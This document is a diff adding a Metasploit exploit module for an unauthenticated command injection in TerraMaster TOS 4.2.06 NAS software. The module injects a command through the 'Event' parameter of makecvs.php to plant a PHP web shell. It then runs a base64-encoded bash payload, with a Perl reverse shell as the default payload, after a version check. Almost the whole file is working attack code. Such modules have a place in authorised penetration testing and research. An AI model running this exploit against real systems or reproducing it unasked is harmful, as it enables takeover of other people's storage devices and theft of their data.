@@ -1,0 +1,120 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "TerraMaster TOS 4.2.06 - Unauthenticated Remote Code Execution",
+      'Description' => %q(
+        This module exploits a unauthenticated command execution vulnerability in TerraMaster TOS.
+        The "Event" parameter in "include/makecvs.php" contains a vulnerability. 
+        "filename" is executing command on system during ".csv" creation. 
+        In order to do this, it is not necessary to have a session in the application.
+        Therefore an unathenticated user can execute the command on the system.
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', #PoC & Metasploit module
+          'IHTeam' # Discovery
+        ],
+      'References' =>
+        [
+          ['CVE', '2020-'],
+          ['URL', 'http://www.pentest.com.tr/exploits/TerraMaster-TOS-4-2-06-Unauthenticated-Remote-Code-Execution.html'],
+          ['URL', 'https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/']
+        ],
+      'Platform' => 'unix',
+      'Arch' => ARCH_CMD,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Dec 12 2020",
+      'DefaultTarget' => 0,
+      'DefaultOptions' =>
+        {
+          'RPORT' => 8181,
+          'SSL'   => false,
+          'PAYLOAD' => 'cmd/unix/reverse_perl' }))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base ERP directory path", '/'])
+      ]
+    )
+  end
+
+  def run_cmd(file,cmd)
+
+    res = send_request_cgi(
+      {
+        'method' => 'POST',
+        'ctype'  => 'application/x-www-form-urlencoded',
+        'uri'     =>  normalize_uri(target_uri.path, "#{file}"),
+        'data' => "cmd=#{cmd}"
+      })
+  end
+
+  def upload_shell
+    sname = Rex::Text.rand_text_alpha_lower(8) + ".php"
+    payload_post = "http|echo \"<?php echo(passthru(\\$_REQUEST['cmd']));?>\" >> /usr/www/#{sname} && chmod +x /usr/www/#{sname}||"
+    @b64p = Rex::Text.encode_base64(payload.encoded)
+    perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
+    payload = Rex::Text.uri_encode(perl_payload)
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri' => normalize_uri(target_uri.path, "include", "makecvs.php"),
+      'vars_get' => {
+        'Event' => "#{payload_post}",
+      }
+    )
+
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     =>  normalize_uri(target_uri.path, "#{sname}"),
+      'vars_post' => {
+        'cmd' => 'id'
+      }
+    )
+
+    if res && res.code == 200 && res.body.include?('uid=')
+      print_good("Upload completed successfully and command executed!")
+      run_cmd("#{sname}",payload)
+    else
+      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
+    end
+  end
+
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    upload_shell    
+  end
+
+  def check
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, "version"),
+    )
+
+    if res && res.code == 200 && res.body
+      version = res.body.split(".0_")[1]
+      print_status("Version : " + res.body)
+      return CheckCode::Detected if version.nil?
+      version = version.split(".").join('')
+      if version <= "4206"
+        return CheckCode::Vulnerable
+      else
+        return CheckCode::Safe
+      end
+    end
+  end
+end
